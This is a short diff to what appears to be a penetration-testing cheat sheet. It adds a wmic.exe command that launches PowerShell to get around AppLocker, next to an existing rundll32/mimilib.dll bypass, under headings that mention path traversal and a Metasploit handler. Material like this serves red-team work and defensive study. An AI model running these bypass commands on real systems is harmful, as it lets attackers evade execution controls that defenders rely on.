@@ -564,6 +564,8 @@ If you have path traversal plus a location with write access you can exploit tha
 ## Bypass Applocker
 - Bypass Applocker with mimilib.dll to run arbitrary executables:  
   `rundll32 c:\path\mimilib.dll,start d:\otherpath\a.exe`  
+- Run PowerShell.exe via wmic.exe:   
+  `wmic.exe process call create "cmd /c powershell"`   
 
 ## Metasploit
 - Multihandler:
